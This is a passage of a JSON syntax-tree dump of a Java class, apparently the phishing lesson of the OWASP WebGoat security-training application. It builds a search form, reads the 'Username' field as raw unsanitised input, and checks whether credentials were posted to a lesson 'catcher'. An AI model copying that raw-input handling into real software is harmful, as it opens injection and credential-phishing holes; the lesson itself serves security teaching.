{"language":"Java","type":"CompilationUnit","pid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":2},"end":{"line":2}}},"property":{"type":"Identifier","name":"owasp"},"loc":{"start":{"line":2},"end":{"line":2}}},"property":{"type":"Identifier","name":"webgoat"},"loc":{"start":{"line":2},"end":{"line":2}}},"property":{"type":"Identifier","name":"lessons"},"loc":{"start":{"line":2},"end":{"line":2}}},"annotations":[],"definitions":[{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"java","loc":{"start":{"line":4},"end":{"line":4}}},"property":{"type":"Identifier","name":"util"},"loc":{"start":{"line":4},"end":{"line":4}}},"property":{"type":"Identifier","name":"ArrayList"},"loc":{"start":{"line":4},"end":{"line":4}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"java","loc":{"start":{"line":5},"end":{"line":5}}},"property":{"type":"Identifier","name":"util"},"loc":{"start":{"line":5},"end":{"line":5}}},"property":{"type":"Identifier","name":"List"},"loc":{"start":{"line":5},"end":{"line":5}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":6},"end":{"line":6}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":6},"end":{"line":6}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":6},"end":{"line":6}}},"property":{"type":"Identifier","name":"Element"},"loc":{"start":{"line":6},"end":{"line":6}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":7},"end":{"line":7}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":7},"end":{"line":7}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":7},"end":{"line":7}}},"property":{"type":"Identifier","name":"ElementContainer"},"loc":{"start":{"line":7},"end":{"line":7}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":8},"end":{"line":8}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":8},"end":{"line":8}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":8},"end":{"line":8}}},"property":{"type":"Identifier","name":"StringElement"},"loc":{"start":{"line":8},"end":{"line":8}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":9},"end":{"line":9}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":9},"end":{"line":9}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":9},"end":{"line":9}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":9},"end":{"line":9}}},"property":{"type":"Identifier","name":"B"},"loc":{"start":{"line":9},"end":{"line":9}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":10},"end":{"line":10}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":10},"end":{"line":10}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":10},"end":{"line":10}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":10},"end":{"line":10}}},"property":{"type":"Identifier","name":"BR"},"loc":{"start":{"line":10},"end":{"line":10}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":11},"end":{"line":11}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":11},"end":{"line":11}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":11},"end":{"line":11}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":11},"end":{"line":11}}},"property":{"type":"Identifier","name":"Comment"},"loc":{"start":{"line":11},"end":{"line":11}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":12},"end":{"line":12}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":12},"end":{"line":12}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":12},"end":{"line":12}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":12},"end":{"line":12}}},"property":{"type":"Identifier","name":"H1"},"loc":{"start":{"line":12},"end":{"line":12}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":13},"end":{"line":13}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":13},"end":{"line":13}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":13},"end":{"line":13}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":13},"end":{"line":13}}},"property":{"type":"Identifier","name":"HR"},"loc":{"start":{"line":13},"end":{"line":13}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":14},"end":{"line":14}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":14},"end":{"line":14}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":14},"end":{"line":14}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":14},"end":{"line":14}}},"property":{"type":"Identifier","name":"Input"},"loc":{"start":{"line":14},"end":{"line":14}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":15},"end":{"line":15}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":15},"end":{"line":15}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":15},"end":{"line":15}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":15},"end":{"line":15}}},"property":{"type":"Identifier","name":"TD"},"loc":{"start":{"line":15},"end":{"line":15}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":16},"end":{"line":16}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":16},"end":{"line":16}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":16},"end":{"line":16}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":16},"end":{"line":16}}},"property":{"type":"Identifier","name":"TH"},"loc":{"start":{"line":16},"end":{"line":16}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":17},"end":{"line":17}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":17},"end":{"line":17}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":17},"end":{"line":17}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":17},"end":{"line":17}}},"property":{"type":"Identifier","name":"TR"},"loc":{"start":{"line":17},"end":{"line":17}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":18},"end":{"line":18}}},"property":{"type":"Identifier","name":"apache"},"loc":{"start":{"line":18},"end":{"line":18}}},"property":{"type":"Identifier","name":"ecs"},"loc":{"start":{"line":18},"end":{"line":18}}},"property":{"type":"Identifier","name":"html"},"loc":{"start":{"line":18},"end":{"line":18}}},"property":{"type":"Identifier","name":"Table"},"loc":{"start":{"line":18},"end":{"line":18}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":19},"end":{"line":19}}},"property":{"type":"Identifier","name":"owasp"},"loc":{"start":{"line":19},"end":{"line":19}}},"property":{"type":"Identifier","name":"webgoat"},"loc":{"start":{"line":19},"end":{"line":19}}},"property":{"type":"Identifier","name":"Catcher"},"loc":{"start":{"line":19},"end":{"line":19}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":20},"end":{"line":20}}},"property":{"type":"Identifier","name":"owasp"},"loc":{"start":{"line":20},"end":{"line":20}}},"property":{"type":"Identifier","name":"webgoat"},"loc":{"start":{"line":20},"end":{"line":20}}},"property":{"type":"Identifier","name":"session"},"loc":{"start":{"line":20},"end":{"line":20}}},"property":{"type":"Identifier","name":"ECSFactory"},"loc":{"start":{"line":20},"end":{"line":20}}}},{"type":"Import","qualid":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"MemberExpression","object":{"type":"Identifier","name":"org","loc":{"start":{"line":21},"end":{"line":21}}},"property":{"type":"Identifier","name":"owasp"},"loc":{"start":{"line":21},"end":{"line":21}}},"property":{"type":"Identifier","name":"webgoat"},"loc":{"start":{"line":21},"end":{"line":21}}},"property":{"type":"Identifier","name":"session"},"loc":{"start":{"line":21},"end":{"line":21}}},"property":{"type":"Identifier","name":"WebSession"},"loc":{"start":{"line":21},"end":{"line":21}}}},{"type":"ClassDeclaration","id":{"type":"Identifier","name":"Phishing"},"modifiers":{"type":"Modifiers","modifiers":["public"],"annotations":[]},"extending":{"type":"Identifier","name":"LessonAdapter","loc":{"start":{"line":54},"end":{"line":54}}},"definitions":[{"type":"VariableDeclarator","id":{"type":"Identifier","name":"SEARCH","vartype":{"type":"Identifier","name":"String","loc":{"start":{"line":60},"end":{"line":60}}}},"modifiers":{"type":"Modifiers","modifiers":["protected","static","final"],"annotations":[]},"vartype":{"type":"Identifier","name":"String","loc":{"start":{"line":60},"end":{"line":60}}},"init":{"type":"Literal","value":"Username","raw":"Username"},"loc":{"start":{"line":60},"end":{"line":60}}},{"type":"VariableDeclarator","id":{"type":"Identifier","name":"searchText","vartype":{"type":"Identifier","name":"String","loc":{"start":{"line":61},"end":{"line":61}}}},"modifiers":{"type":"Modifiers","modifiers":["private"],"annotations":[]},"vartype":{"type":"Identifier","name":"String","loc":{"start":{"line":61},"end":{"line":61}}},"loc":{"start":{"line":61},"end":{"line":61}}},{"type":"FunctionDeclaration","id":{"type":"Identifier","name":"postedCredentials"},"modifiers":{"type":"Modifiers","modifiers":["private"],"annotations":[]},"restype":{"type":"PrimitiveType"},"typarams":[],"params":[{"type":"Identifier","name":"s","vartype":{"type":"Identifier","name":"WebSession","loc":{"start":{"line":70},"end":{"line":70}}}}],"thrown":[],"body":{"type":"BlockStatement","body":[{"type":"VariableDeclarator","id":{"type":"Identifier","name":"postedToCookieCatcher","vartype":{"type":"Identifier","name":"String","loc":{"start":{"line":72},"end":{"line":72}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"String","loc":{"start":{"line":72},"end":{"line":72}}},"init":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"Identifier","name":"getLessonTracker","loc":{"start":{"line":72},"end":{"line":72}}},"arguments":[{"type":"Identifier","name":"s","loc":{"start":{"line":72},"end":{"line":72}}}],"loc":{"start":{"line":72},"end":{"line":72}}},"property":{"type":"Identifier","name":"getLessonProperties"},"loc":{"start":{"line":72},"end":{"line":72}}},"arguments":[],"loc":{"start":{"line":72},"end":{"line":72}}},"property":{"type":"Identifier","name":"getProperty"},"loc":{"start":{"line":72},"end":{"line":72}}},"arguments":[{"type":"MemberExpression","object":{"type":"Identifier","name":"Catcher","loc":{"start":{"line":72},"end":{"line":72}}},"property":{"type":"Identifier","name":"PROPERTY"},"loc":{"start":{"line":72},"end":{"line":72}}},{"type":"MemberExpression","object":{"type":"Identifier","name":"Catcher","loc":{"start":{"line":73},"end":{"line":73}}},"property":{"type":"Identifier","name":"EMPTY_STRING"},"loc":{"start":{"line":73},"end":{"line":73}}}],"loc":{"start":{"line":72},"end":{"line":73}}},"loc":{"start":{"line":72},"end":{"line":73}}},{"type":"ReturnStatement","argument":{"argument":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"postedToCookieCatcher","loc":{"start":{"line":76},"end":{"line":76}}},"property":{"type":"Identifier","name":"equals"},"loc":{"start":{"line":76},"end":{"line":76}}},"arguments":[{"type":"MemberExpression","object":{"type":"Identifier","name":"Catcher","loc":{"start":{"line":76},"end":{"line":76}}},"property":{"type":"Identifier","name":"EMPTY_STRING"},"loc":{"start":{"line":76},"end":{"line":76}}}],"loc":{"start":{"line":76},"end":{"line":76}}},"operator":"LOGICAL_COMPLEMENT","type":"UnaryExpression","loc":{"start":{"line":76},"end":{"line":76}}},"loc":{"start":{"line":76},"end":{"line":76}}}],"loc":{"start":{"line":71},"end":{"line":78}}},"code":"\nprivate boolean postedCredentials(WebSession s) {\n    String postedToCookieCatcher \u003d getLessonTracker(s).getLessonProperties().getProperty(Catcher.PROPERTY, Catcher.EMPTY_STRING);\n    return (!postedToCookieCatcher.equals(Catcher.EMPTY_STRING));\n}","loc":{"start":{"line":70},"end":{"line":78}}},{"type":"FunctionDeclaration","id":{"type":"Identifier","name":"createContent"},"modifiers":{"type":"Modifiers","modifiers":["protected"],"annotations":[]},"restype":{"type":"Identifier","name":"Element","loc":{"start":{"line":87},"end":{"line":87}}},"typarams":[],"params":[{"type":"Identifier","name":"s","vartype":{"type":"Identifier","name":"WebSession","loc":{"start":{"line":87},"end":{"line":87}}}}],"thrown":[],"body":{"type":"BlockStatement","body":[{"type":"VariableDeclarator","id":{"type":"Identifier","name":"ec","vartype":{"type":"Identifier","name":"ElementContainer","loc":{"start":{"line":89},"end":{"line":89}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"ElementContainer","loc":{"start":{"line":89},"end":{"line":89}}},"init":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"ElementContainer","loc":{"start":{"line":89},"end":{"line":89}}},"arguments":[],"loc":{"start":{"line":89},"end":{"line":89}}},"loc":{"start":{"line":89},"end":{"line":89}}},{"type":"TryStatement","handlers":[{"type":"CatchClause","param":{"type":"Identifier","name":"e","vartype":{"type":"Identifier","name":"Exception","loc":{"start":{"line":102},"end":{"line":102}}}},"body":{"type":"BlockStatement","body":[{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"s","loc":{"start":{"line":104},"end":{"line":104}}},"property":{"type":"Identifier","name":"setMessage"},"loc":{"start":{"line":104},"end":{"line":104}}},"arguments":[{"type":"BinaryExpression","operator":"PLUS","left":{"type":"Literal","value":"Error generating ","raw":"Error generating "},"right":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"ThisExpression"},"property":{"type":"Identifier","name":"getClass"},"loc":{"start":{"line":104},"end":{"line":104}}},"arguments":[],"loc":{"start":{"line":104},"end":{"line":104}}},"property":{"type":"Identifier","name":"getName"},"loc":{"start":{"line":104},"end":{"line":104}}},"arguments":[],"loc":{"start":{"line":104},"end":{"line":104}}},"loc":{"start":{"line":104},"end":{"line":104}}}],"loc":{"start":{"line":104},"end":{"line":104}}},"loc":{"start":{"line":104},"end":{"line":104}}}],"loc":{"start":{"line":103},"end":{"line":105}}},"loc":{"start":{"line":102},"end":{"line":105}}}],"block":{"type":"BlockStatement","body":[{"type":"ExpressionStatement","expression":{"type":"AssignmentExpression","left":{"type":"Identifier","name":"searchText","loc":{"start":{"line":93},"end":{"line":93}}},"right":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"s","loc":{"start":{"line":93},"end":{"line":93}}},"property":{"type":"Identifier","name":"getParser"},"loc":{"start":{"line":93},"end":{"line":93}}},"arguments":[],"loc":{"start":{"line":93},"end":{"line":93}}},"property":{"type":"Identifier","name":"getRawParameter"},"loc":{"start":{"line":93},"end":{"line":93}}},"arguments":[{"type":"Identifier","name":"SEARCH","loc":{"start":{"line":93},"end":{"line":93}}},{"type":"Literal","value":"","raw":""}],"loc":{"start":{"line":93},"end":{"line":93}}},"loc":{"start":{"line":93},"end":{"line":93}}},"loc":{"start":{"line":93},"end":{"line":93}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":97},"end":{"line":97}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":97},"end":{"line":97}}},"arguments":[{"type":"CallExpression","typeargs":[],"callee":{"type":"Identifier","name":"makeSearch","loc":{"start":{"line":97},"end":{"line":97}}},"arguments":[{"type":"Identifier","name":"s","loc":{"start":{"line":97},"end":{"line":97}}}],"loc":{"start":{"line":97},"end":{"line":97}}}],"loc":{"start":{"line":97},"end":{"line":97}}},"loc":{"start":{"line":97},"end":{"line":97}}},{"type":"IfStatement","test":{"type":"CallExpression","typeargs":[],"callee":{"type":"Identifier","name":"postedCredentials","loc":{"start":{"line":98},"end":{"line":98}}},"arguments":[{"type":"Identifier","name":"s","loc":{"start":{"line":98},"end":{"line":98}}}],"loc":{"start":{"line":98},"end":{"line":98}}},"consequent":{"type":"BlockStatement","body":[{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"Identifier","name":"makeSuccess","loc":{"start":{"line":100},"end":{"line":100}}},"arguments":[{"type":"Identifier","name":"s","loc":{"start":{"line":100},"end":{"line":100}}}],"loc":{"start":{"line":100},"end":{"line":100}}},"loc":{"start":{"line":100},"end":{"line":100}}}],"loc":{"start":{"line":99},"end":{"line":101}}},"loc":{"start":{"line":98},"end":{"line":101}}}],"loc":{"start":{"line":92},"end":{"line":102}}},"loc":{"start":{"line":91},"end":{"line":105}}},{"type":"ReturnStatement","argument":{"type":"Identifier","name":"ec","loc":{"start":{"line":107},"end":{"line":107}}},"loc":{"start":{"line":107},"end":{"line":107}}}],"loc":{"start":{"line":88},"end":{"line":108}}},"code":"\nprotected Element createContent(WebSession s) {\n    ElementContainer ec \u003d new ElementContainer();\n    try {\n        searchText \u003d s.getParser().getRawParameter(SEARCH, \"\");\n        ec.addElement(makeSearch(s));\n        if (postedCredentials(s)) {\n            makeSuccess(s);\n        }\n    } catch (Exception e) {\n        s.setMessage(\"Error generating \" + this.getClass().getName());\n    }\n    return (ec);\n}","loc":{"start":{"line":87},"end":{"line":108}}},{"type":"FunctionDeclaration","id":{"type":"Identifier","name":"makeSearch"},"modifiers":{"type":"Modifiers","modifiers":["protected"],"annotations":[]},"restype":{"type":"Identifier","name":"Element","loc":{"start":{"line":110},"end":{"line":110}}},"typarams":[],"params":[{"type":"Identifier","name":"s","vartype":{"type":"Identifier","name":"WebSession","loc":{"start":{"line":110},"end":{"line":110}}}}],"thrown":[],"body":{"type":"BlockStatement","body":[{"type":"VariableDeclarator","id":{"type":"Identifier","name":"ec","vartype":{"type":"Identifier","name":"ElementContainer","loc":{"start":{"line":112},"end":{"line":112}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"ElementContainer","loc":{"start":{"line":112},"end":{"line":112}}},"init":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"ElementContainer","loc":{"start":{"line":112},"end":{"line":112}}},"arguments":[],"loc":{"start":{"line":112},"end":{"line":112}}},"loc":{"start":{"line":112},"end":{"line":112}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"ec","loc":{"start":{"line":114},"end":{"line":114}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":114},"end":{"line":114}}},"arguments":[{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"H1","loc":{"start":{"line":114},"end":{"line":114}}},"arguments":[],"loc":{"start":{"line":114},"end":{"line":114}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":114},"end":{"line":114}}},"arguments":[{"type":"Literal","value":"WebGoat Search ","raw":"WebGoat Search "}],"loc":{"start":{"line":114},"end":{"line":114}}}],"loc":{"start":{"line":114},"end":{"line":114}}},"loc":{"start":{"line":114},"end":{"line":114}}},{"type":"VariableDeclarator","id":{"type":"Identifier","name":"t","vartype":{"type":"Identifier","name":"Table","loc":{"start":{"line":115},"end":{"line":115}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"Table","loc":{"start":{"line":115},"end":{"line":115}}},"init":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"Table","loc":{"start":{"line":115},"end":{"line":115}}},"arguments":[],"loc":{"start":{"line":115},"end":{"line":115}}},"property":{"type":"Identifier","name":"setCellSpacing"},"loc":{"start":{"line":115},"end":{"line":115}}},"arguments":[{"type":"Literal","value":0,"raw":0}],"loc":{"start":{"line":115},"end":{"line":115}}},"property":{"type":"Identifier","name":"setCellPadding"},"loc":{"start":{"line":115},"end":{"line":115}}},"arguments":[{"type":"Literal","value":2,"raw":2}],"loc":{"start":{"line":115},"end":{"line":115}}},"property":{"type":"Identifier","name":"setBorder"},"loc":{"start":{"line":115},"end":{"line":115}}},"arguments":[{"type":"Literal","value":0,"raw":0}],"loc":{"start":{"line":115},"end":{"line":115}}},"property":{"type":"Identifier","name":"setAlign"},"loc":{"start":{"line":115},"end":{"line":115}}},"arguments":[{"type":"Literal","value":"center","raw":"center"}],"loc":{"start":{"line":115},"end":{"line":115}}},"loc":{"start":{"line":115},"end":{"line":115}}},{"type":"VariableDeclarator","id":{"type":"Identifier","name":"tr","vartype":{"type":"Identifier","name":"TR","loc":{"start":{"line":117},"end":{"line":117}}}},"modifiers":{"type":"Modifiers","modifiers":[],"annotations":[]},"vartype":{"type":"Identifier","name":"TR","loc":{"start":{"line":117},"end":{"line":117}}},"init":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TR","loc":{"start":{"line":117},"end":{"line":117}}},"arguments":[],"loc":{"start":{"line":117},"end":{"line":117}}},"loc":{"start":{"line":117},"end":{"line":117}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"tr","loc":{"start":{"line":118},"end":{"line":118}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":118},"end":{"line":118}}},"arguments":[{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TD","loc":{"start":{"line":118},"end":{"line":118}}},"arguments":[],"loc":{"start":{"line":118},"end":{"line":118}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":118},"end":{"line":118}}},"arguments":[{"type":"Literal","value":"\u0026nbsp;","raw":"\u0026nbsp;"}],"loc":{"start":{"line":118},"end":{"line":118}}},"property":{"type":"Identifier","name":"setColSpan"},"loc":{"start":{"line":118},"end":{"line":118}}},"arguments":[{"type":"Literal","value":2,"raw":2}],"loc":{"start":{"line":118},"end":{"line":118}}}],"loc":{"start":{"line":118},"end":{"line":118}}},"loc":{"start":{"line":118},"end":{"line":118}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"t","loc":{"start":{"line":119},"end":{"line":119}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":119},"end":{"line":119}}},"arguments":[{"type":"Identifier","name":"tr","loc":{"start":{"line":119},"end":{"line":119}}}],"loc":{"start":{"line":119},"end":{"line":119}}},"loc":{"start":{"line":119},"end":{"line":119}}},{"type":"IfStatement","test":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"s","loc":{"start":{"line":120},"end":{"line":120}}},"property":{"type":"Identifier","name":"isColor"},"loc":{"start":{"line":120},"end":{"line":120}}},"arguments":[],"loc":{"start":{"line":120},"end":{"line":120}}},"consequent":{"type":"BlockStatement","body":[{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"t","loc":{"start":{"line":122},"end":{"line":122}}},"property":{"type":"Identifier","name":"setBorder"},"loc":{"start":{"line":122},"end":{"line":122}}},"arguments":[{"type":"Literal","value":1,"raw":1}],"loc":{"start":{"line":122},"end":{"line":122}}},"loc":{"start":{"line":122},"end":{"line":122}}}],"loc":{"start":{"line":121},"end":{"line":123}}},"loc":{"start":{"line":120},"end":{"line":123}}},{"type":"ExpressionStatement","expression":{"type":"AssignmentExpression","left":{"type":"Identifier","name":"tr","loc":{"start":{"line":125},"end":{"line":125}}},"right":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TR","loc":{"start":{"line":125},"end":{"line":125}}},"arguments":[],"loc":{"start":{"line":125},"end":{"line":125}}},"loc":{"start":{"line":125},"end":{"line":125}}},"loc":{"start":{"line":125},"end":{"line":125}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"tr","loc":{"start":{"line":126},"end":{"line":126}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":126},"end":{"line":126}}},"arguments":[{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TH","loc":{"start":{"line":126},"end":{"line":126}}},"arguments":[],"loc":{"start":{"line":126},"end":{"line":126}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":126},"end":{"line":126}}},"arguments":[{"type":"Literal","value":"This facility will search the WebGoat source.","raw":"This facility will search the WebGoat source."}],"loc":{"start":{"line":126},"end":{"line":126}}},"property":{"type":"Identifier","name":"setColSpan"},"loc":{"start":{"line":126},"end":{"line":126}}},"arguments":[{"type":"Literal","value":2,"raw":2}],"loc":{"start":{"line":126},"end":{"line":126}}},"property":{"type":"Identifier","name":"setAlign"},"loc":{"start":{"line":126},"end":{"line":127}}},"arguments":[{"type":"Literal","value":"center","raw":"center"}],"loc":{"start":{"line":126},"end":{"line":127}}}],"loc":{"start":{"line":126},"end":{"line":127}}},"loc":{"start":{"line":126},"end":{"line":127}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"t","loc":{"start":{"line":128},"end":{"line":128}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":128},"end":{"line":128}}},"arguments":[{"type":"Identifier","name":"tr","loc":{"start":{"line":128},"end":{"line":128}}}],"loc":{"start":{"line":128},"end":{"line":128}}},"loc":{"start":{"line":128},"end":{"line":128}}},{"type":"ExpressionStatement","expression":{"type":"AssignmentExpression","left":{"type":"Identifier","name":"tr","loc":{"start":{"line":130},"end":{"line":130}}},"right":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TR","loc":{"start":{"line":130},"end":{"line":130}}},"arguments":[],"loc":{"start":{"line":130},"end":{"line":130}}},"loc":{"start":{"line":130},"end":{"line":130}}},"loc":{"start":{"line":130},"end":{"line":130}}},{"type":"ExpressionStatement","expression":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"Identifier","name":"tr","loc":{"start":{"line":131},"end":{"line":131}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":131},"end":{"line":131}}},"arguments":[{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"CallExpression","typeargs":[],"callee":{"type":"MemberExpression","object":{"type":"NewExpression","typeargs":[],"callee":{"type":"Identifier","name":"TD","loc":{"start":{"line":131},"end":{"line":131}}},"arguments":[],"loc":{"start":{"line":131},"end":{"line":131}}},"property":{"type":"Identifier","name":"addElement"},"loc":{"start":{"line":131},"end":{"line":131}}},"arguments":[{"type":"Literal","value":"\u0026nbsp;","raw":"\u0026nbsp;"}],"loc":{"start":{"line":131},"end":{"line":131}}},"property":{"type":"Identifier","name":"setColSpan"},"loc":{"start":{"line":131},"end":{"line":131}}},"arguments":[{"type":"Literal","value":2,"raw":2}],"loc":{"start":{"line":131},"end":{"line":131}}}],"l